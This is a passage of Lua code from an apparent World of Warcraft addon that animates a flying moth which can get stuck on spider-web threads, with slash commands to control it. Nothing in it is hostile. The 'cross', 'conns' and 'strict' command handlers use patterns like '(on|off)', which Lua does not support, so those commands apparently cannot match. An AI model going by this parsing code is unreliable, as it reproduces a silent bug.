                local scale = cfg.STUCK_OFFSET_MAX / offLen

                s.offX = s.offX * scale
                s.offY = s.offY * scale

                s.twitchVelX = s.twitchVelX * 0.35
                s.twitchVelY = s.twitchVelY * 0.35
            end

            s.x = baseX + s.offX
            s.y = baseY + s.offY

            self:Place()

            return
        end
    end

    -----------------------------------------------------------------------
    -- Free flight.
    -----------------------------------------------------------------------

    s.speedTimer = s.speedTimer - dt

    if s.speedTimer <= 0 then
        s.speedTimer = 0.30 + math.random() * 0.95

        s.desiredSpeed = cfg.SPEED_MIN
            + math.random() * (cfg.SPEED_MAX - cfg.SPEED_MIN)
    end

    local speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    if speed < 1 then
        self:KickOff()

        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
    end

    local turn = (math.random() - 0.5) * 2 * cfg.TURN * dt

    local cosTurn = math.cos(turn)
    local sinTurn = math.sin(turn)

    local rvx = s.vx * cosTurn - s.vy * sinTurn
    local rvy = s.vx * sinTurn + s.vy * cosTurn

    s.vx, s.vy = rvx, rvy

    s.vx = s.vx + (math.random() - 0.5) * 2 * cfg.NOISE * dt
    s.vy = s.vy + (math.random() - 0.5) * 2 * cfg.NOISE * dt

    s.jerkTimer = s.jerkTimer - dt

    if s.jerkTimer <= 0 then
        s.jerkTimer = cfg.JERK_MIN + math.random() * (cfg.JERK_MAX - cfg.JERK_MIN)

        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

        if speed < 1 then
            self:KickOff()

            speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
        end

        local baseAngle = math.atan2(s.vy, s.vx)

        local mode = math.random()
        local offset

        if mode < 0.60 then
            local side = (math.random() < 0.5) and -1 or 1

            offset = side * (math.pi / 4 + math.random() * math.pi / 2)
        elseif mode < 0.85 then
            offset = (math.random() - 0.5) * math.pi * 0.45
        else
            offset = math.pi + (math.random() - 0.5) * math.pi * 0.60
        end

        local imp = cfg.BURST_SPEED_MIN
            + math.random() * (cfg.BURST_SPEED_MAX - cfg.BURST_SPEED_MIN)

        s.vx = s.vx + math.cos(baseAngle + offset) * imp
        s.vy = s.vy + math.sin(baseAngle + offset) * imp
    end

    speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    if speed < 1 then
        self:KickOff()

        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
    end

    local maxBurst = cfg.SPEED_MAX * 1.65

    if speed > maxBurst then
        local scale = maxBurst / speed

        s.vx = s.vx * scale
        s.vy = s.vy * scale

        speed = maxBurst
    end

    local targetSpeed = s.desiredSpeed

    if targetSpeed < cfg.SPEED_MIN then
        targetSpeed = cfg.SPEED_MIN
    end

    local newSpeed = speed + (targetSpeed - speed) * math.min(1, dt * 2.2)

    if newSpeed < cfg.SPEED_MIN then
        newSpeed = cfg.SPEED_MIN
    end

    local scale = newSpeed / speed

    s.vx = s.vx * scale
    s.vy = s.vy * scale

    s.x = s.x + s.vx * dt
    s.y = s.y + s.vy * dt

    local sw, sh = self:ScreenSize()

    local bounced = false

    if s.x < cfg.MARGIN then
        s.x = cfg.MARGIN
        s.vx = math.abs(s.vx)
        s.vy = s.vy + (math.random() - 0.5) * 90

        bounced = true
    elseif s.x > sw - cfg.MARGIN then
        s.x = sw - cfg.MARGIN
        s.vx = -math.abs(s.vx)
        s.vy = s.vy + (math.random() - 0.5) * 90

        bounced = true
    end

    if s.y < cfg.MARGIN then
        s.y = cfg.MARGIN
        s.vy = math.abs(s.vy)
        s.vx = s.vx + (math.random() - 0.5) * 90

        bounced = true
    elseif s.y > sh - cfg.MARGIN then
        s.y = sh - cfg.MARGIN
        s.vy = -math.abs(s.vy)
        s.vx = s.vx + (math.random() - 0.5) * 90

        bounced = true
    end

    if bounced then
        local a = (math.random() - 0.5) * math.pi * 0.35

        local cosB = math.cos(a)
        local sinB = math.sin(a)

        local bvx = s.vx * cosB - s.vy * sinB
        local bvy = s.vx * sinB + s.vy * cosB

        s.vx, s.vy = bvx, bvy
    end

    -----------------------------------------------------------------------
    -- Web collision check.
    -----------------------------------------------------------------------

    s.checkTimer = s.checkTimer + dt

    if s.checkTimer >= cfg.CHECK_INTERVAL then
        s.checkTimer = 0

        if s.clickImmunity <= 0
            and type(NSPauk) == "table"
            and type(NSPauk.S) == "table"
            and type(NSPauk.S.instances) == "table" then
            local owner, t = self:FindWeb(s.x, s.y)

            if owner then
                s.stuckOwner = owner
                s.stuckT = t
                s.offX = 0
                s.offY = 0
                s.twitchVelX = 0
                s.twitchVelY = 0
                s.twitchTimer = 0
                s.clickImmunity = 0
                s.flapInterval = cfg.FLAP_STUCK * (0.65 + math.random() * 0.70)

                s.x, s.y = self:ThreadPointAt(owner.thread, t)
            end
        end
    end

    self:Place()
end

---------------------------------------------------------------------------
-- Bootstrap + /nsmothblock
---------------------------------------------------------------------------
if type(SlashCmdList) == "table" then
    _G.SLASH_NSPAUKMOTHBLOCK1 = "/nsmothblock"
    SlashCmdList["NSPAUKMOTHBLOCK"] = function(msg)
        NSPauk_Moth:ToggleBlocked()
    end
end

if NSPauk_Moth:IsBlockedByDB() then
    NSPauk_Moth:Block()
else
    local bootstrap = CreateFrame("Frame")
    NSPauk_Moth.bootstrap = bootstrap

    bootstrap:RegisterEvent("PLAYER_LOGIN")
    bootstrap:SetScript("OnEvent", function()
        if NSPauk_Moth:IsBlockedByDB() then
            NSPauk_Moth:Block()
        else
            NSPauk_Moth:Init()
        end
    end)

    if IsLoggedIn and IsLoggedIn() then
        NSPauk_Moth:Init()
    end
end

---------------------------------------------------------------------------
-- Minimal runtime slash commands
---------------------------------------------------------------------------

if type(SlashCmdList) == "table" then
    _G.SLASH_NSPAUKMOTH1 = "/nsmoth"

    SlashCmdList["NSPAUKMOTH"] = function(msg)
        local m = TrimLower(msg)

        if m == "" or m == "help" then
            NSPauk_Moth:Print("commands:")
            NSPauk_Moth:Print("/nsmoth freeze")
            NSPauk_Moth:Print("/nsmoth destroy")
            NSPauk_Moth:Print("/nsmoth respawn")
            NSPauk_Moth:Print("/nsmoth timer")
            NSPauk_Moth:Print("/nsmoth parent auto|web|ui")
            NSPauk_Moth:Print("/nsmoth cross on|off")
            NSPauk_Moth:Print("/nsmoth conns on|off")
            NSPauk_Moth:Print("/nsmoth strict on|off")
            NSPauk_Moth:Print("/nsmoth chance 1/3")

            return
        end

        if m == "freeze" then
            NSPauk_Moth:Freeze()

            return
        end

        if m == "destroy" or m == "kill" or m == "remove" then
            NSPauk_Moth:Destroy()

            return
        end

        if m == "respawn" then
            NSPauk_Moth:Respawn()

            return
        end

        if m == "timer" then
            if NSPauk_Moth.respawnRemaining then
                local sec = math.floor(NSPauk_Moth.respawnRemaining + 0.5)

                NSPauk_Moth:Print(
                    "respawn in",
                    string.format("%d:%02d", math.floor(sec / 60), sec % 60)
                )
            else
                NSPauk_Moth:Print("no respawn timer")
            end

            return
        end

        if m == "parent" then
            NSPauk_Moth:Print("parentMode=", tostring(NSPauk_Moth.parentMode or "auto"))

            return
        end

        local parentMode = string.match(m, "^parent%s+(%a+)$")

        if parentMode then
            if parentMode == "auto" or parentMode == "web" or parentMode == "ui" then
                NSPauk_Moth.parentMode = parentMode

                NSPauk_Moth:Place()

                NSPauk_Moth:Print("parentMode=", parentMode)
            else
                NSPauk_Moth:Print("unknown parent mode:", parentMode, "(use auto|web|ui)")
            end

            return
        end

        local crossMode = string.match(m, "^cross%s+(on|off)$")

        if crossMode then
            NSPauk_Moth.cfg.STICK_CROSSSEGS = (crossMode == "on")

            if not NSPauk_Moth.cfg.STICK_CROSSSEGS and NSPauk_Moth.state.stuckOwner then
                NSPauk_Moth:Release()
            end

            NSPauk_Moth:Print("STICK_CROSSSEGS=", tostring(NSPauk_Moth.cfg.STICK_CROSSSEGS))

            return
        end

        local connsMode = string.match(m, "^conns%s+(on|off)$")

        if connsMode then
            NSPauk_Moth.cfg.STICK_CONNS = (connsMode == "on")

            if not NSPauk_Moth.cfg.STICK_CONNS and NSPauk_Moth.state.stuckOwner then
                NSPauk_Moth:Release()
            end

            NSPauk_Moth:Print("STICK_CONNS=", tostring(NSPauk_Moth.cfg.STICK_CONNS))

            return
        end

        local strictMode = string.match(m, "^strict%s+(on|off)$")

        if strictMode then
            NSPauk_Moth.cfg.STICK_ONLY_VISIBLE_TEXTURE = (strictMode == "on")

            if NSPauk_Moth.state.stuckOwner then
                NSPauk_Moth:Release()
            end

            NSPauk_Moth:Print(
                "STICK_ONLY_VISIBLE_TEXTURE=",
                tostring(NSPauk_Moth.cfg.STICK_ONLY_VISIBLE_TEXTURE)
            )

            return
        end

        if m == "chance" then
            NSPauk_Moth:Print(
                "STICK_CHANCE=",
                tostring(NSPauk_Moth.cfg.STICK_CHANCE),
                "requireLeave=",
                tostring(NSPauk_Moth.cfg.STICK_FAIL_REQUIRE_LEAVE)
            )

            return
        end

        local chanceValue = string.match(m, "^chance%s+(.+)$")

        if chanceValue then
            local num = tonumber(chanceValue)

            if not num then
                local a, b = string.match(chanceValue, "^(%d+)%s*/%s*(%d+)$")

                if a and b then
                    local den = tonumber(b)

                    if den and den ~= 0 then
                        num = tonumber(a) / den
                    end
                end
            end

            if num then
                if num < 0 then
                    num = 0
                elseif num > 1 then
                    num = 1
                end

                NSPauk_Moth.cfg.STICK_CHANCE = num

                NSPauk_Moth:Print("STICK_CHANCE=", tostring(NSPauk_Moth.cfg.STICK_CHANCE))
            else
                NSPauk_Moth:Print("invalid chance:", chanceValue, "(use 0..1 or 1/3)")
            end

            return
        end

        NSPauk_Moth:Print("unknown command:", msg, "type /nsmoth help")
    end
end